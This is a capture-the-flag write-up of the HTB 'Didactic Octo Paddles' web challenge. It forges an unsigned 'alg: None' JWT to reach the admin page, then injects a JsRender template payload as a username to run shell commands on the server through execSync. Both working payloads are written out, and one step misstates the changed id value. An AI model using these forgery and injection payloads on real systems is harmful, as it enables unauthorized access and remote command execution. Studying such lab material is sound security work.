---
description: >-
  Write Up For HTB Cyber Apocalypse CTF 2023 Web challenge Didactic Octo Paddles
title: Didactic Octo Paddles
date: 2023-03-24 08:00:00 -0400
categories: [CTFs, HTB Cyber Apocalypse CTF 2023, Web Exploitation]
tags: [web-exploitation]
---

You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop's system to obtain information on the relic's location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.

----

## Overview

Didactic Octo Paddles was an exhilarating web-based challenge featured in the HTB Cyber Apocalypse CTF. It required a combination of two exploits to unveil the answer. The challenge aimed to test participants' skills in reading source code, particularly in Node JS.

## Getting Started

The first step was to run the provided Docker file and explore the website.

```bash
bash build_docker.sh
```

The source code was readily available, providing an opportunity to analyze the inner workings of the paddle shop's system. A critical file, `routes/index.js`, contained the APIs and routes necessary for the challenge. By examining this file, one could identify the various pages and their functionalities. The pages included:

- **admin**: Accessible only to administrators, this page listed all the users.

- **cart**: Displayed the items added to the user's cart.

- **index**: The first page displayed after logging in, showcasing the available products.

- **login**: The initial landing page for users who were not logged in.

- **register**: Used to register new users.

It is essential to explore both the `views` folder and the `routes\index.js` file thoroughly. While the former houses the HTML pages rendered by the application, the latter specifies the routes and their corresponding rendering. Hidden information may be present in either location, making it crucial to investigate both.

## Navigating the Source Code

As we proceed, I encounter several vital components of the code:

- The code employs JWT for admin user verification, with a randomly generated secret code.

- The `challenge\utils\database.js` file contains an SQL databases. Upon execution, this script creates a basic list of products and an admin user. While the admin username is known (`admin`), the randomly generated password makes it challenging to guess or brute force; therefore I exclude the possibility of brute forcing.

- Two middleware components, `AdminMiddleware.js` and `AuthMiddleware.js`, play critical roles in the challenge.
    
	- `AdminMiddleware.js` decodes the JWT token, ensuring the admin possesses the correct ID and username.
    
	- `AuthMiddleware.js` checks the validity of the JWT token. If valid, the user is directed to the `/` (index) page; otherwise, they are redirected to the `login` page.

- The `AdminMiddleware.js` file specifically caught my attention. Instead of utilizing a fixed decoding algorithm (`decoded.header.alg`), the code allows users to select their preferred algorithm. I made an note of this intriguing observation, while I continued reading the code.


### JSrender

As I continued my exploration, something catches my eye: the utilization of `jsrender`. The spellcheck in my VSCode editor highlighted this library, drawing my attention. Curiosity piqued, I inspect the code snippet responsible for rendering the admin page (only place in router.js where `jsrender` was used):

```js
res.render("admin", {
	users: jsrender.templates(`${usernames}`).render(),
});
```

This discovery prompted me to search for vulnerabilities in the `jsrender` package. Although I find a known [vulnerability called Template Injection](https://security.snyk.io/package/npm/jsrender) for versions `<=0.9.73`, the challenge employs version `^1.0.12`, rendering the vulnerability ineffective. Nevertheless, I kept this security issue in mind, acknowledging its presence as it might be useful later in the future.

### Checking for SQLi

Next, I embark on a quest to discover any potential SQL injection (SQLi) vulnerabilities. Given the prevalence of SQLi attacks, this exploration proves crucial. However, despite my efforts, I fail to uncover any SQL-related vulnerabilities within the code.


## Exploitation Avenue: JWT Algorithm Manipulation

Returning to my earlier observation regarding users' ability to choose the decoding algorithm, I ponder the implications. I conducted a quick search to expand my knowledge and stumble upon an article describing vulnerabilities associated with JWT tokens. The [article](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) outlines various exploits, but one in particular catches my eye: modifying the algorithm to "None" ([CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)).

Considering that the challenge allows us to modify the algorithm, this exploit seemed like the perfect opportunity. 

```js
 const user = jwt.verify(sessionCookie, null, {
	algorithms: [decoded.header.alg], // NOTE: User Can Modify decoded.header.alg
});
```

With this knowledge in mind, I proceeded to log in as a test user, retrieve the JWT token stored in the cookies, and decoded it using a JWT decoding tool such as [jwt.io](https://jwt.io/).

JWT tokens consist of three parts separated by dots: the header, payload, and signature. The exploit revolves around modifying the "alg" field in the header to "None." Armed with this information, I base64-encoded the modified header.

- Base64 Decoded JWT header: `{"alg":"HS256","typ":"JWT"}`

- Change _algorithm_ to **"None"**: `{"alg":"None","typ":"JWT"}`

- [Base64 encode the changed header](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/')&input=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0): `eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0`


To verify the exploit's success, I modified the second part of the JWT token to have an ID of 1, knowing that the admin user likely holds this ID. 

- Base64 Decoded JWT payload: `{"id":2,"iat":1679364743,"exp":1679368343}`

- Change *id* to **1**: `{"id":2,"iat":1679364743,"exp":1679368343}`

- Base64 encode the changed payload: `eyJpZCI6MiwiaWF0IjoxNjc5MzY0NzQzLCJleHAiOjE2NzkzNjgzNDN9`

Finally, I remove the signature while retaining the period separators.

End JWT Payload:

```
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MzY0NzQzLCJleHAiOjE2NzkzNjgzNDN9.
```

> Note:
> This payload listed about might not work for you since there is expiration date specified. So make sure to create your own payload or change the "exp" date.


Armed with my modified payload, I replace the original cookie (session) with the exploit payload and navigate to the `/admin` page.

Lo and behold, success! The modified JWT token allows access to the admin page, confirming the validity of the exploit. The admin user, alongside other registered users, is displayed proudly on the page.


![Successfully Gone to admin page](https://imgur.com/ByNihBn.png)


## Unleashing the Exploit: Server-Side Template Injection (SSTI)

Energized by my progress, I refocus my efforts on exploiting the application further to acquire the coveted `flag.txt`.

After thoroughly reviewing the code, I discovered that the username field offered the most promising avenue for exploitation.

> Unfortunately, the limitations (lack of API) on the cart prevent me from utilizing it for exploitation purposes.

Remembering the potential for server-side template injection (SSTI) in the username, I investigate this avenue. A [GitHub page dedicated to server-side template injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md#jsrender-nodejs) catches my attention, and I discover a payload example specifically tailored for JSRender and Node.js environments.


Excitedly, I created a user with the payload provided on the GitHub page:

```js
{% raw %}{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}{% endraw %}
```

The payload acts as the username, rather than the password, as usernames will be displayed on the admin page. I submit the payload and hold my breath, waiting for the magic to unfold.


Success! The payload triggers the desired effect, revealing the content of `/etc/passwd`.

![Image Showing content of `/etc/passwd` after the exploit successfully worked](https://imgur.com/QjJgJ4E.png)


With the SSTI vulnerability confirmed, I crafted a new payload to directly access the `flag.txt` file. The payload looked like this:

```js
{% raw %}{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat ../flag.txt').toString()")()}}{% endraw %}
```

I was well aware of the `flag.txt` location due to the insights provided by the Dockerfile

The exploit worked flawlessly, and I finally obtained the flag:

```
HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
```

## Reflections

Didactic Octo Paddles proved to be an exhilarating challenge that tested my hacking skills and expanded my knowledge in the realm of web exploitation. It required a combination of clever tactics, careful analysis of the source code, and an understanding of JWT vulnerabilities.

Throughout this adventure, I discovered the power of JWT algorithm manipulation, leveraging the "None" algorithm to gain unauthorized access. This technique was new to me and provided invaluable insights into the intricacies of JWT security.

Additionally, the exploration of server-side template injection (SSTI) using `jsrender` revealed the potential dangers lurking within third-party libraries. It served as a reminder of the importance of scrutinizing all aspects of an application, even seemingly benign user inputs.

In conclusion, Didactic Octo Paddles was an incredible journey of discovery, challenges, and triumphs. It expanded my hacking repertoire, challenged my problem-solving abilities, and left me with a sense of accomplishment.


## Resources

- [https://security.snyk.io/package/npm/jsrender](https://security.snyk.io/package/npm/jsrender)
- [https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [https://attackdefense.com/challengedetailsnoauth?cid=1351](https://attackdefense.com/challengedetailsnoauth?cid=1351)
- [https://jwt.io](https://jwt.io)
- [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)
- [https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md#jsrender-nodejs](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md#jsrender-nodejs)